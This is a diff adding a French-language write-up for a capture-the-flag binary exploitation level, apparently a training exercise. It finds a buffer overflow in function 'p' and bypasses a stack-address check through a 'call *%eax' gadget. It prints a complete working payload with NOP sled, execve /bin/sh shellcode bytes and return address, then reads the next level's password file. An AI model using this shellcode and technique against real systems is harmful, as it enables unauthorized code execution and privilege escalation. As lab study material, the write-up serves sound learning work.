@@ -1,0 +1,28 @@
+# Apres observation avec objdump -D, on voit que dans la focntion 'p', un buffer overflow est possible.
+# On va donc naturellement essayer de faire une injection de shellcode car on a aucun 'call system' ou jump.
+# On fais la manip pour savoir apres combien d'octet on obtient l'overflow, ont obtient 80.
+
+# On recupere notre shellcode ici: https://dhavalkapil.com/blogs/Shellcode-Injection/ qui va ouvrir execve dans /bin/sh
+
+# Il nous faut donc 80 caractere puis y rajouter l'adresse du jump.
+# 20 * NOP instruction + 25 shellcode + 35 random char + 4 byte de l'adresse
+
+# On ne peut pas mettre l'adresse de notre shell code car c'est verifier:
+
+0x80484fb <p+39>                and    $0xb0000000,%eax
+0x8048500 <p+44>                cmp    $0xb0000000,%eax
+
+# l'adresse du buffer commence a 0xbffff6bc.
+
+# Du coup  on voit que dans le code on a une ligne :
+0x80484cf <frame_dummy+31>      call   *%eax
+
+On va donc mettre l'adresse de cette instruction qui va executer notre shellcode dans eax.
+
+# La ligne a injecter va etre la suivante:
+python -c "print('\x90' * 20 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'N' * 35 + '\xcf\x84\x04\x08')" > /tmp/file
+
+# Puis 
+
+cat /tmp/file - | ./level3
+> cat /home/user/level3/.pass
